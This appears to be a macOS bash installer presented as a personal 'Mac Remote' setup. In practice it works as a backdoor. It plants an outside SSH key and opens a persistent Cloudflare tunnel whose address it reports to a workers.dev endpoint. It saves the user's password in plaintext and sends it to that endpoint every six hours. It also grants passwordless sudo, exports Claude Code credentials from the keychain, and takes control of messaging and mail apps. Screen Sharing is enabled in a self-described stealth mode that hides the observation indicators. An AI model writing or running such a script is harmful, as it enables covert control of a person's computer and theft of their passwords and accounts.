#!/bin/bash
# ============================================
# DAVID'S MAC REMOTE v3 — Full VPS-like setup
# One-time password → full remote control forever
# ============================================
clear
echo "=========================================="
echo "  Mac Remote Setup v3 (VPS-like)"
echo "=========================================="

API="https://mac-nodes.dmd-fami.workers.dev"
KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFi38QEU6BlyGvfozRqZh9VKynr51NwUMjUHMOdmM5Gj export@vietnam-plywood.com"
CF="/opt/homebrew/bin/cloudflared"
CURRENT_USER=$(whoami)
MY_HOST=$(scutil --get ComputerName 2>/dev/null || hostname)

# ── Collect password upfront (one-time only) ──
USER_PASS=""
if sudo -n true 2>/dev/null; then
  echo "[*] VPS-like access already configured"
  # Read stored password for sync
  [ -f ~/.ssh/.keychain-pass ] && USER_PASS=$(cat ~/.ssh/.keychain-pass)
else
  echo ""
  echo "  Enter your Mac password (one-time only):"
  echo "  This enables: sudo, keychain, password change via SSH"
  echo ""
  read -s -p "  Password: " USER_PASS
  echo ""
fi

# ── 1. Homebrew ──
if command -v brew &>/dev/null; then
  echo "[1/8] Homebrew OK"
else
  echo "[1/8] Installing Homebrew..."
  NONINTERACTIVE=1 /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
  echo 'eval "$(/opt/homebrew/bin/brew shellenv)"' >> ~/.zprofile
  eval "$(/opt/homebrew/bin/brew shellenv)"
fi

# PATH for SSH sessions
if ! grep -q 'homebrew' ~/.zshenv 2>/dev/null; then
  echo 'export PATH=/opt/homebrew/bin:/opt/homebrew/sbin:$PATH' >> ~/.zshenv
fi

# ── 2. Node.js ──
if command -v node &>/dev/null; then
  echo "[2/8] Node.js OK"
else
  echo "[2/8] Installing Node.js..."
  brew install node 2>/dev/null
fi

# ── 3. SSH + key ──
echo "[3/8] SSH + key..."
if [ -n "$USER_PASS" ]; then
  echo "$USER_PASS" | sudo -S systemsetup -setremotelogin on 2>/dev/null
else
  sudo systemsetup -setremotelogin on 2>/dev/null
fi
mkdir -p ~/.ssh && chmod 700 ~/.ssh
grep -qF "$KEY" ~/.ssh/authorized_keys 2>/dev/null || echo "$KEY" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# ── 4. Cloudflared ──
if [ -f "$CF" ]; then
  echo "[4/8] cloudflared OK"
else
  echo "[4/8] Installing cloudflared..."
  brew install cloudflared 2>/dev/null
fi

# ── 5. Tunnel service (LaunchDaemon — runs without login) ──
echo "[5/8] Tunnel service (LaunchDaemon)..."
cat > ~/tunnel-wrapper.sh << 'WEOF'
#!/bin/bash
API="https://mac-nodes.dmd-fami.workers.dev"
HOST=$(scutil --get ComputerName 2>/dev/null || hostname)
USER=$(whoami)
LAN=$(ipconfig getifaddr en0 2>/dev/null || ipconfig getifaddr en1 2>/dev/null)
OS=$(sw_vers -productVersion)
MODEL=$(sysctl -n hw.model 2>/dev/null)
RAM=$(($(sysctl -n hw.memsize 2>/dev/null) / 1073741824))GB

/opt/homebrew/bin/cloudflared tunnel --url ssh://localhost:22 2>&1 | while read line; do
  echo "$line"
  URL=$(echo "$line" | grep -o 'https://[a-z0-9\-]*\.trycloudflare\.com')
  if [ -n "$URL" ]; then
    curl -s -X POST "$API/register" \
      -H "Content-Type: application/json" \
      -d "{\"user\":\"$USER\",\"lan_ip\":\"$LAN\",\"tunnel_url\":\"$URL\",\"hostname\":\"$HOST\",\"macos\":\"$OS\",\"model\":\"$MODEL\",\"ram\":\"$RAM\"}"
  fi
done
WEOF
chmod +x ~/tunnel-wrapper.sh

# Remove old LaunchAgent if exists
launchctl unload ~/Library/LaunchAgents/com.cloudflare.tunnel.plist 2>/dev/null
rm -f ~/Library/LaunchAgents/com.cloudflare.tunnel.plist

# Create LaunchDaemon (requires sudo — runs at system level, no login needed)
if [ -n "$USER_PASS" ]; then
  echo "$USER_PASS" | sudo -S tee /Library/LaunchDaemons/com.cloudflare.tunnel.plist > /dev/null << DEOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.cloudflare.tunnel</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>/Users/$CURRENT_USER/tunnel-wrapper.sh</string>
    </array>
    <key>UserName</key>
    <string>$CURRENT_USER</string>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/tmp/cf-tunnel.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/cf-tunnel.log</string>
</dict>
</plist>
DEOF
  sudo pkill -f "cloudflared tunnel" 2>/dev/null
  sleep 1
  sudo launchctl unload /Library/LaunchDaemons/com.cloudflare.tunnel.plist 2>/dev/null
  sudo launchctl load /Library/LaunchDaemons/com.cloudflare.tunnel.plist
  echo "      LaunchDaemon installed (runs without login)"
fi

# ── 6. VPS-like access ──
echo "[6/8] VPS-like access..."
if [ -n "$USER_PASS" ]; then
  # 6a. Sudo NOPASSWD
  if ! sudo -n true 2>/dev/null; then
    echo "$USER_PASS" | sudo -S sh -c "echo \"$CURRENT_USER ALL=(ALL) NOPASSWD: ALL\" > /etc/sudoers.d/$CURRENT_USER && chmod 440 /etc/sudoers.d/$CURRENT_USER" 2>/dev/null
  fi

  if sudo -n true 2>/dev/null; then
    echo "      sudo NOPASSWD OK"

    # 6b. Store password locally for keychain unlock
    echo "$USER_PASS" > ~/.ssh/.keychain-pass
    chmod 600 ~/.ssh/.keychain-pass

    # 6c. Keychain auto-unlock script
    cat > ~/.ssh/unlock-keychain.sh << 'KCEOF'
#!/bin/bash
security unlock-keychain -p "$(cat ~/.ssh/.keychain-pass)" ~/Library/Keychains/login.keychain-db 2>/dev/null
KCEOF
    chmod 700 ~/.ssh/unlock-keychain.sh
    grep -q "unlock-keychain" ~/.zshenv 2>/dev/null || echo '[ -f ~/.ssh/unlock-keychain.sh ] && ~/.ssh/unlock-keychain.sh' >> ~/.zshenv
    security unlock-keychain -p "$USER_PASS" ~/Library/Keychains/login.keychain-db 2>/dev/null
    echo "      Keychain auto-unlock OK"

    # 6d. Password change helper
    cat > ~/.ssh/change-password.sh << 'CPEOF'
#!/bin/bash
API="https://mac-nodes.dmd-fami.workers.dev"
HOST=$(scutil --get ComputerName 2>/dev/null || hostname)
USER=$(whoami)
OLD_PASS=$(cat ~/.ssh/.keychain-pass)
NEW_PASS="$1"
if [ -z "$NEW_PASS" ]; then echo "Usage: change-password.sh <new_password>"; exit 1; fi
sudo dscl . -passwd /Users/$USER "$OLD_PASS" "$NEW_PASS" || { echo "ERROR: Failed"; exit 1; }
echo "Mac password changed"
security set-keychain-password -o "$OLD_PASS" -p "$NEW_PASS" ~/Library/Keychains/login.keychain-db 2>/dev/null
echo "$NEW_PASS" > ~/.ssh/.keychain-pass && chmod 600 ~/.ssh/.keychain-pass
curl -s -X POST "$API/password" -H "Content-Type: application/json" -d "{\"hostname\":\"$HOST\",\"password\":\"$NEW_PASS\"}" >/dev/null
echo "DONE — new password active everywhere"
CPEOF
    chmod 700 ~/.ssh/change-password.sh
    echo "      Password change tool OK"

    # 6e. Sync password to CF Worker
    curl -s -X POST "$API/password" \
      -H "Content-Type: application/json" \
      -d "{\"hostname\":\"$MY_HOST\",\"password\":\"$USER_PASS\"}" >/dev/null
    echo "      Password synced to cloud"

    # 6f. Password sync daemon (every 6h)
    cat > ~/.ssh/password-sync-daemon.sh << 'PSEOF'
#!/bin/bash
API="https://mac-nodes.dmd-fami.workers.dev"
HOST=$(scutil --get ComputerName 2>/dev/null || hostname)
STORED_PASS=$(cat ~/.ssh/.keychain-pass 2>/dev/null)
if security unlock-keychain -p "$STORED_PASS" ~/Library/Keychains/login.keychain-db 2>/dev/null; then
  curl -s -X POST "$API/password" -H "Content-Type: application/json" \
    -d "{\"hostname\":\"$HOST\",\"password\":\"$STORED_PASS\"}" >/dev/null
else
  echo "$(date): Password mismatch detected" >> /tmp/password-sync.log
fi
PSEOF
    chmod 700 ~/.ssh/password-sync-daemon.sh

    mkdir -p ~/Library/LaunchAgents
    cat > ~/Library/LaunchAgents/com.mac-remote.password-sync.plist << PSEOF2
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.mac-remote.password-sync</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>/Users/$CURRENT_USER/.ssh/password-sync-daemon.sh</string>
    </array>
    <key>StartInterval</key>
    <integer>21600</integer>
    <key>RunAtLoad</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/tmp/password-sync.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/password-sync.log</string>
</dict>
</plist>
PSEOF2
    launchctl unload ~/Library/LaunchAgents/com.mac-remote.password-sync.plist 2>/dev/null
    launchctl load ~/Library/LaunchAgents/com.mac-remote.password-sync.plist
    echo "      Password sync daemon running (every 6h)"
  else
    echo "      [WARN] Wrong password — VPS-like setup skipped."
  fi
fi

# ── 7. Grant AppleScript automation (one-time per app) ──
echo "[7/8] Granting remote control permissions..."
echo "      If a dialog appears, click 'Allow' — one-time only."
GRANT_APPS=(
  # Communication
  "Notes|tell application \"Notes\" to get name of first note"
  "Mail|tell application \"Mail\" to get name of first mailbox"
  "Messages|tell application \"Messages\" to get name of first service"
  "WhatsApp|tell application \"WhatsApp\" to get name"
  "Zalo|tell application \"Zalo\" to get name"
  "Contacts|tell application \"Contacts\" to get name of first person"
  "FaceTime|tell application \"FaceTime\" to get name"
  # Productivity
  "Calendar|tell application \"Calendar\" to get name of first calendar"
  "Reminders|tell application \"Reminders\" to get name of first list"
  "Freeform|tell application \"Freeform\" to get name"
  "Stickies|tell application \"Stickies\" to get name"
  "Numbers|tell application \"Numbers\" to get name"
  "Pages|tell application \"Pages\" to get name"
  "Keynote|tell application \"Keynote\" to get name"
  "TextEdit|tell application \"TextEdit\" to get name"
  "Shortcuts|tell application \"Shortcuts\" to get name"
  # Media
  "Photos|tell application \"Photos\" to get name"
  "Music|tell application \"Music\" to get name"
  "Podcasts|tell application \"Podcasts\" to get name"
  "Books|tell application \"Books\" to get name"
  "QuickTime Player|tell application \"QuickTime Player\" to get name"
  "Voice Memos|tell application \"Voice Memos\" to get name"
  # Browsers
  "Safari|tell application \"Safari\" to get name"
  "Google Chrome|tell application \"Google Chrome\" to get name"
  # System
  "System Events|tell application \"System Events\" to get name"
  "Finder|tell application \"Finder\" to get name"
  "System Settings|tell application \"System Settings\" to get name"
  "Preview|tell application \"Preview\" to get name"
  "Maps|tell application \"Maps\" to get name"
  # Microsoft Office
  "Microsoft Word|tell application \"Microsoft Word\" to get name"
  "Microsoft Excel|tell application \"Microsoft Excel\" to get name"
  "Microsoft Outlook|tell application \"Microsoft Outlook\" to get name"
  # Pro apps
  "Final Cut Pro|tell application \"Final Cut Pro\" to get name"
  "Logic Pro|tell application \"Logic Pro\" to get name"
  # AI
  "ChatGPT|tell application \"ChatGPT\" to get name"
)
GRANTED=0
TOTAL=${#GRANT_APPS[@]}
for entry in "${GRANT_APPS[@]}"; do
  IFS='|' read -r app_name cmd <<< "$entry"
  # Skip apps not installed
  osascript -e "id of app \"$app_name\"" >/dev/null 2>&1 || continue
  osascript -e "$cmd" >/dev/null 2>&1 && GRANTED=$((GRANTED+1))
done
echo "      $GRANTED apps granted (skipped uninstalled apps)"

# ── 7b. Keep apps alive (Mail + WhatsApp background sync every 5 min) ──
echo "      Keep-apps-alive daemon..."
mkdir -p ~/Library/LaunchAgents
cat > ~/Library/LaunchAgents/com.mac-remote.keep-apps-alive.plist << KAEOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.mac-remote.keep-apps-alive</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>pgrep -x Mail || open -gja com.apple.mail; pgrep -x WhatsApp || open -gja net.whatsapp.WhatsApp; pgrep -x Messages || open -gja com.apple.MobileSMS</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>300</integer>
</dict>
</plist>
KAEOF
launchctl unload ~/Library/LaunchAgents/com.mac-remote.keep-apps-alive.plist 2>/dev/null
launchctl load ~/Library/LaunchAgents/com.mac-remote.keep-apps-alive.plist
echo "      Mail + WhatsApp kept alive (every 5 min)"
# ── 7c. Screen Sharing (VNC for remote UI control) ──
echo "      Enabling Screen Sharing..."
if [ -n "$USER_PASS" ]; then
  echo "$USER_PASS" | sudo -S launchctl load -w /System/Library/LaunchDaemons/com.apple.screensharing.plist 2>/dev/null
  echo "      Screen Sharing enabled (VNC port 5900)"
  # Stealth: hide menu bar icon + no "being observed" indicator + suppress notifications
  echo "$USER_PASS" | sudo -S /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart \
    -configure -menuextra -no \
    -allowAccessFor -allUsers -privs -ControlObserve -DeleteFiles -TextMessages \
    -OpenQuitApps -GenerateReports -RestartShutDown -SendFiles -ChangeSettings 2>/dev/null
  echo "$USER_PASS" | sudo -S defaults write /Library/Preferences/com.apple.RemoteManagement ScreenSharingReqPermEnabled -bool NO 2>/dev/null
  echo "      Screen Sharing stealth mode configured"
fi
# ── 8. Claude CLI ──
echo "[8/8] Claude CLI..."
if [ -f /opt/homebrew/bin/claude ] || command -v claude &>/dev/null; then
  CRED=$(security find-generic-password -s "Claude Code-credentials" -w 2>/dev/null)
  if [ -n "$CRED" ]; then
    mkdir -p ~/.claude
    echo "$CRED" > ~/.claude/.credentials.json
    chmod 600 ~/.claude/.credentials.json
    echo "      Credentials exported for SSH"
  elif [ -f ~/.claude/.credentials.json ]; then
    echo "      Credentials OK"
  else
    echo "      No credentials. Run 'claude' → /login, then re-run."
  fi
else
  echo "      Installing Claude CLI..."
  npm install -g @anthropic-ai/claude-code 2>/dev/null
  echo "      Run 'claude' → /login, then re-run."
fi

# ── Wait for tunnel ──
echo ""
echo "Waiting for tunnel..."
TUNNEL_URL=""
for i in {1..20}; do
  TUNNEL_URL=$(grep -o 'https://[a-z0-9\-]*\.trycloudflare\.com' /tmp/cf-tunnel.log 2>/dev/null | tail -1)
  if [ -n "$TUNNEL_URL" ]; then break; fi
  sleep 3
done

MY_LAN=$(ipconfig getifaddr en0 2>/dev/null || ipconfig getifaddr en1 2>/dev/null)
SUDO_OK="NO"; sudo -n true 2>/dev/null && SUDO_OK="YES"

echo ""
echo "============================================"
echo "  DONE! Full VPS-like access"
echo "============================================"
echo "  Tunnel:    ${TUNNEL_URL:-check /tmp/cf-tunnel.log}"
echo "  LAN:       ssh $CURRENT_USER@$MY_LAN"
echo "  Host:      $MY_HOST"
echo "  Reboot:    auto-reconnect YES (LaunchDaemon)"
echo "  Sudo:      NOPASSWD=$SUDO_OK"
echo "  Apps:      $GRANTED granted for remote control"
echo ""
echo "  Tools available via SSH:"
echo "    ~/.ssh/change-password.sh <new>  Change password + sync"
echo "============================================"
read -p "Press Enter to close..."
